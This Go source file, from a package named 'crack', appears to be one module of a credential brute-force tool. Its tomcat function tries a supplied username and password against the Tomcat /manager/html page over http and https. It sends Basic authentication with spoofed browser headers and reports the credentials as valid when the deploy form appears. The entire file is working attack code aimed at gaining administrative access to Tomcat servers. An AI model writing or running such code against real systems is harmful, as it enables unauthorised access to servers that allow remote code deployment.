package crack

import (
	"encoding/base64"
	"fmt"
	"golang.org/x/net/context"
	"io"
	"net/http"
	"strings"
	"time"
)

func tomcat(cancel context.CancelFunc, ip, user, passwd string, port, timeout int) {
	url := fmt.Sprintf("%s:%d", ip, port)
	base64passwd := fmt.Sprintf("%s:%s", user, passwd)
	base64passwd = base64.StdEncoding.EncodeToString([]byte(base64passwd))
	client := &http.Client{
		Timeout: time.Duration(timeout) * time.Second,
	}
	protocol := []string{"http", "https"}
	for _, t := range protocol {
		req, err := http.NewRequest("GET", fmt.Sprintf("%s://%s/manager/html", t, url), nil)
		if err != nil {
			continue
		}
		req.Header.Add("Host", url)
		req.Header.Add("Cache-Control", "max-age=0")
		req.Header.Add("Authorization", fmt.Sprintf("Basic %s", base64passwd))
		req.Header.Add("Upgrade-Insecure-Requests", "1")
		req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
		req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		//req.Header.Add("Referer", "http://")
		req.Header.Add("Accept-Encoding", "gzip, deflate")
		req.Header.Add("Accept-Language", "zh-CN,zh;q=0.9")
		req.Header.Add("Connection", "close")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		if resp != nil {
			defer resp.Body.Close()
		}

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			continue
		}

		if strings.Contains(string(body), `action="/manager/html/deploy`) {
			end(ip, user, passwd, port, "Tomcat")
			cancel()
		}
	}

}
